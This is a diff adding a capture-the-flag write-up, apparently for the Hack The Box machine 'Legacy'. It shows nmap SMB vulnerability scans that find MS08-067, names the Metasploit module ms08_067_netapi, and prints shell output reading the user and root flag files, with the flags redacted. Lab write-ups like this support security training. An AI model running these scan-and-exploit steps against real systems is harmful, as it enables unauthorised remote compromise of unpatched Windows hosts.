@@ -1,0 +1,51 @@
+#####################
+# Sources and Links #
+#####################
+
+#########
+# TL,DR #
+#########
+This is an old XP machine, hence 'Legacy'.
+Using an nmap vuln scan shows the machine is vulnerable to MS08-067.
+A metasploit module grants access to user and root. 
+
+########
+# Hack #
+########
+
+# The nmap vuln script showed that Legacy may be vulnerable to EternalBlue.
+After launching a metasploit module and pointing RHOSTS to 10.10.10.4,
+the exploit was unable to crack into the box.
+However, nmap can be further utilized to scan the box for smb vulns
+
+ls /usr/share/nmap/scripts | grep vuln | grep smb
+nmap --script smb-vuln* 10.10.10.4
+
+mb-vuln-ms08-067:
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+
+Metasploit has an exploit :)
+   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+This grants a shell, but it currently is laggy and times out.
+cd "C:\Documents and Settings\john\Desktop\"
+
+C:\Documents and Settings\john\Desktop>type user.txt
+type user.txt
+REDACTED FOR WALKTHROUGH 
+
+We also have access to root!
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+type root.txt
+REDACTED FOR WALKTHROUGH 
+
+##########
+# Learned #
+##########
+Looking through nmap script files:
+ls /usr/share/nmap/scripts | grep vuln | grep smb
+
+nmap --script smb-vuln* 10.10.10.4
